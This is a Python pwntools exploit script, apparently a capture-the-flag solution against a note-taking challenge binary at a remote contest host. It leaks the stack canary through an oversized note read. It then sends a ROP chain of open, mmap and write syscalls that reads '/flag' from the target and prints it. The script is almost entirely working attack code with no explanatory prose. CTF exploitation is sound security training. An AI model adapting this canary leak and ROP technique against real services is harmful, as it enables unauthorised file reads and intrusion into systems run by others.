from pwn import *

# Set up pwntools for the correct architecture
exe = "./chall"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x040193A
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def create():
    sla(b"> ", b"1")
    ru(b"Addr of note ")
    data = rl().split()
    return data[0], data[2]

def write(ind, size, cont):
    sla(b"> ", b"2")
    sla(b"idx = ", str(ind).encode())
    sla(b"write = ", str(size).encode())
    if(cont != b""):
        sl(cont)

def read(ind):
    sla(b"> ", b"3")
    sla(b"idx = ", str(ind).encode())
    return ru(b"1. create note")

# r = start()   
r = remote("win.the.seetf.sg", 2000)

l = []

for i in range(24):
    ind, addr = create()
    l.append(addr)

print(l)

#flag addr
write(int(ind), 6, b"/flag\x00")
flag_addr = int(addr, 16)

offset = 0x1740 + 0x30
write("3", offset, b"")
canary_val = u64(read("3")[-22:-14])

log.info(f"canary: {hex(canary_val)}")


pop_rax = p64(0x0000000000401491)  
pop_rbx = p64(0x00000000004014a4)  
pop_rcx = p64(0x000000000040149e) 
pop_rdi = p64(0x000000000040148f)  
pop_rdx = p64(0x0000000000401495)  
pop_rsi = p64(0x0000000000401493)  
pop_rsp = p64(0x00000000004014a0) 
pop_r10 = p64(0x0000000000401497)
pop_r8  = p64(0x000000000040149a)
pop_r9  = p64(0x000000000040149d)
syscall = p64(0x00000000004014a8)

payload = b"4" + b"A"*23 + p64(canary_val)
payload += b"deadbeef"

# open syscall
payload += pop_rdi + p64(flag_addr) + pop_rax + p64(2) + pop_rsi + p64(0) + pop_rdx + p64(0) + syscall

#mmap syscall
payload += pop_rdi + p64(int(addr, 16) - 0x1000) + pop_rsi + p64(200) + pop_rdx + p64(4) + pop_r10 + p64(17) + pop_r8 + p64(3) + pop_r9 + p64(0) + pop_rax + p64(9) + syscall

#write the mmaped region
payload += pop_rsi + p64(int(addr, 16) - 0x1000) + pop_rax + p64(1) + pop_rdi + p64(1) + pop_rdx + p64(1500) + syscall

sl(payload)

r.interactive()